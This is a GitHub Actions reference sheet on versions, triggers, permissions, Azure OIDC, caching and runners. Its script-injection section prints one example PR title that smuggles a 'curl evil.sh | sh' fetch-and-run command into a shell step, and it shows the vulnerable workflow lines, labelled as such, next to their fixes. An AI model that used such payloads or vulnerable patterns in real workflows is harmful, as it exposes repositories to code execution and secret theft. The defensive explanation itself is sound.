# GitHub Actions Reference

Verified against upstream release pages, August 2026. Action majors move fast — re-check
before pinning.

## Contents

- [Action versions](#action-versions) · [Actions that don't exist](#actions-that-dont-exist) · [Triggers](#triggers)
- [permissions](#permissions-and-github_token) · [Azure OIDC](#azure-oidc-login) · [Script injection](#script-injection) · [Matrix and concurrency](#matrix-fail-fast-concurrency)
- [Graceful skip](#graceful-skip-for-missing-secrets) · [Self-hosted runners](#self-hosted-runners-arc) · [Composite vs reusable](#composite-actions-vs-reusable-workflows) · [Caching](#caching-correctness) · [Debugging](#debugging)

## Action versions

| Action | Latest major | Note |
|---|---|---|
| `actions/checkout` | **v7** (v7.0.1, Jul 2026) | v5 (Aug 2025) was the Node 24 bump |
| `actions/setup-dotnet` | **v6** (Jul 2026) | v6 migrated to ESM |
| `actions/cache` | **v6** (v6.1.0, Jun 2026) | v6.1 added read-only access |
| `actions/upload-artifact` | **v7** (v7.0.1, Apr 2026) | v7 adds `archive: false` |
| `actions/download-artifact` | **v8** (v8.0.1, Mar 2026) | v8 errors on hash mismatch |
| `Azure/login` | **v3** (v3.0.1, Aug 2026) | v2 still patched (v2.3.1) |

`@v4` for these is a 2024-era pin: still runs, but ships Node 20 actions and misses the
fork-checkout hardening added across checkout v4.4/v5.1/v6.1/v7.0.1 in July 2026.

**The artifact major skew.** Since late 2025 the two artifact actions are not on the same
number — they pair diagonally: upload v4→download v4, v5→v6, v6→v7, **v7→v8**. `upload@v7` +
`download@v7` looks symmetrical and is wrong; non-zipped artifacts need download v8.

**v3 artifact actions are dead, not deprecated.** `upload-artifact@v3`/`download-artifact@v3`
were shut off by GitHub on 30 Jan 2025 and hard-fail the step, no warning; same for
`actions/cache@v1/v2`. Usually the answer when a workflow untouched since 2024 "breaks and
nothing changed".

## Actions that don't exist

**`actions/setup-powershell` does not exist.** `pwsh` is preinstalled on all hosted runners
including `ubuntu-*` — use `shell: pwsh`; a setup step fails at action resolution. Likewise
`actions/setup-azure-cli` (`az` is preinstalled) and `actions/setup-bicep` (in the Azure
CLI). `actions/setup-terraform` is really `hashicorp/setup-terraform@v3`.

## Triggers

```yaml
on:
  push: { branches: [main], paths: ['infra/**', '.github/workflows/deploy.yml'] }  # paths OR-ed
  pull_request: { types: [opened, synchronize, reopened] }    # this IS the default set
  workflow_dispatch:
    inputs:                                    # types: string|boolean|choice|environment|number
      environment: { type: choice, options: [dev, prod], required: true }
      destroy:     { type: boolean, default: false }
  workflow_call:                               # makes this a reusable workflow
    inputs:  { environment: { type: string, required: true } }
    secrets: { AZURE_CLIENT_ID: { required: true } }
  schedule: [{ cron: '17 3 * * 1' }]           # ALWAYS UTC. No DST.
```

- `paths` filters **do not apply** to `workflow_dispatch` or `schedule`, and `paths` /
  `paths-ignore` cannot both appear on one event.
- A path-filtered workflow that doesn't match produces **silence, not a skip marker** — a
  required status check that never runs blocks the PR forever. Add an always-run shim job.
- `${{ inputs.destroy }}` preserves the boolean; `${{ github.event.inputs.destroy }}` gives
  the truthy string `"false"`. Use `inputs`. `schedule` on a fork silently disables after
  60 days of repo inactivity.

**`pull_request_target`** runs with a read/write token and full secret access, in base-repo
context, for fork PRs. Checking out the PR head under it runs attacker code with your secrets:

```yaml
on: pull_request_target        # NEVER combine with:
  - uses: actions/checkout@v7
    with: { ref: ${{ github.event.pull_request.head.sha }} }   # RCE
```

Legitimate uses never check out head code (labeling, commenting). Build fork code under
`pull_request` (no secrets), with a separate gated deploy.

## permissions and GITHUB_TOKEN

```yaml
permissions: {}                                    # deny at workflow level
jobs:
  deploy:
    permissions: { contents: read, id-token: write }   # id-token: REQUIRED for OIDC
```

- Missing `id-token: write` surfaces as `Unable to get ACTION_ID_TOKEN_REQUEST_URL` — that
  error means the line is absent, not that the federated credential is wrong.
- `GITHUB_TOKEN` **cannot trigger other workflows**; a push made with it won't fire
  `on: push`. Use a GitHub App token for cascades.
- Fork PRs get a read-only token and no secrets regardless of `permissions`.

## Azure OIDC login

```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: Azure/login@v3
    with:
      client-id:       ${{ vars.AZURE_CLIENT_ID }}     # not secrets — these aren't secret
      tenant-id:       ${{ vars.AZURE_TENANT_ID }}
      subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

The other half is a federated identity credential in Entra ID whose **subject must match
exactly**: issuer `https://token.actions.githubusercontent.com`, audience
`api://AzureADTokenExchange`, subject one of:

| Scenario | subject |
|---|---|
| Branch / tag | `repo:ORG/REPO:ref:refs/heads/main` · `...:ref:refs/tags/v1.2.3` |
| PR / environment | `repo:ORG/REPO:pull_request` · `repo:ORG/REPO:environment:prod` |

`AADSTS70021: No matching federated identity record found` is a *subject string* problem,
not a permissions problem. Environment-scoped subjects take priority — a job declaring
`environment: prod` uses that form even on a push to main, so a branch-only credential
won't match.

## Script injection

`github.event.*` is attacker-controlled text substituted into the script **before** the
shell parses it. A PR titled `a"; curl evil.sh | sh; #` executes:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"   # VULNERABLE
```

Fix with env indirection — the value never enters script text:

```yaml
- env: { PR_TITLE: '${{ github.event.pull_request.title }}' }
  run: echo "Title: $PR_TITLE"
```

Tainted: `pull_request.title/.body/.head.ref/.head.label`, `issue.title/.body`,
`comment.body`, `review.body`, `commits[].message`, `head_commit.message`, `*.user.login`.
Repo/org names are constrained; **branch names are not**. Same rule for
`actions/github-script` bodies and composite inputs reaching a `run:`.

## Matrix, fail-fast, concurrency

```yaml
strategy:
  fail-fast: false          # default true cancels siblings on first failure
  matrix:
    os: [ubuntu-24.04, windows-latest]
    tfm: [net8.0, net9.0]
    include: [{ os: ubuntu-24.04, tfm: net9.0, publish: true }]
    exclude: [{ os: windows-latest, tfm: net8.0 }]
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

- `include` entries matching an existing combo add variables; ones that don't **add a job**.
- `cancel-in-progress: true` on a deploy can kill a half-applied Terraform run. Use `false`
  (queue) for anything that mutates infrastructure.
- Pin `runs-on` to a dated image (`ubuntu-24.04`) for infra jobs — `ubuntu-latest` rolls on
  GitHub's schedule; check `actions/runner-images` releases rather than assuming.

## Graceful skip for missing secrets

Secrets are unavailable to fork PRs, and `secrets` is not readable in a job-level `if:` —
hence the probe job. The gated job then reports *skipped*, not *failed*:

```yaml
jobs:
  probe:
    runs-on: ubuntu-latest
    outputs: { has-azure: '${{ steps.p.outputs.has-azure }}' }
    steps:
      - id: p
        env: { CLIENT_ID: '${{ secrets.AZURE_CLIENT_ID }}' }
        run: '[ -n "$CLIENT_ID" ] && echo has-azure=true >>"$GITHUB_OUTPUT" || echo has-azure=false >>"$GITHUB_OUTPUT"'
  deploy:
    needs: probe
    if: needs.probe.outputs.has-azure == 'true'
```
Design rule: **validation runs offline for everyone; deployment gates on secrets.**

## Self-hosted runners (ARC)

Install `gha-runner-scale-set-controller` once per cluster, then a `gha-runner-scale-set`
release per pool:

```yaml
githubConfigUrl: https://github.com/ORG/REPO   # or .../ORG for org-level
githubConfigSecret: { github_token: "${GH_PAT}" }
# GitHub App form (preferred): github_app_id, github_app_installation_id,
#   github_app_private_key — or a plain string naming a pre-created k8s secret
runnerScaleSetName: helios-linux    # THIS is the runs-on value
minRunners: 0                       # true scale-to-zero
maxRunners: 20
containerMode: { type: dind }       # dind | kubernetes | kubernetes-novolume
template:
  spec:
    containers: [{ name: runner, image: ghcr.io/actions/actions-runner:latest }]
```

- `runs-on: helios-linux` — the scale set name, singular. Scale sets do **not** match
  `[self-hosted, linux, x64]` arrays; that is the older `RunnerDeployment` model.
- `minRunners: 0` queues jobs ~20-40s for a cold pod. Use `1` when latency matters.
- `dind` needs privileged but supports `services:` and container actions. `kubernetes` mode
  requires `kubernetesModeWorkVolumeClaim` (RWO PVC per job) and breaks some actions —
  default to `dind` unless policy forbids privileged.
- A PAT ties every runner to one human's account. Use a GitHub App for shared pools.

## Composite actions vs reusable workflows

| | Composite action | Reusable workflow |
|---|---|---|
| Unit / called from | steps, inside a job | jobs, at `jobs.x.uses` |
| Runner | inherits caller's | picks its own `runs-on` |
| Secrets | via inputs | `secrets:` block or `secrets: inherit` |
| Matrix / environments | no | yes |

Composite for "these five steps always go together"; reusable workflow for separate jobs,
different runners, environments/approvals, or matrices. Max 4 deep, never from a step.

## Caching correctness

```yaml
- uses: actions/cache@v6
  with:
    path: ~/.nuget/packages
    key:          ${{ runner.os }}-nuget-${{ hashFiles('**/packages.lock.json') }}
    restore-keys: ${{ runner.os }}-nuget-
```

- `key` is exact; `restore-keys` are ordered prefixes. A `key` hit means **no save** at job
  end; a restore-keys-only hit restores *and* re-saves under the new key — that asymmetry is
  the whole design. Include `runner.os` (and arch on mixed fleets).
- Caches are **immutable**; bump a version prefix to invalidate. A branch reads its own
  cache, its base's, and the default branch's — never a sibling PR's, so warm on `main`.
- 10 GB/repo, LRU-evicted, 7 days unused. Artifacts default to 90-day retention and bill
  against storage; caches do not.

## Debugging

```bash
gh run view <run-id> --log-failed        # only failed steps — always start here
gh run rerun <run-id> --failed --debug
gh workflow run deploy.yml -f environment=dev
```

- Repo/org variables `ACTIONS_STEP_DEBUG=true` / `ACTIONS_RUNNER_DEBUG=true` enable verbose
  logs (they work as secrets too, if your org blocks variables).
- When a conditional misbehaves, dump context: `env: {C: '${{ toJSON(github) }}'}` then
  `run: echo "$C"`.
- Run **`actionlint`** in CI — expression typos, bad `needs` references, and shell issues,
  caught far faster than push-and-pray.
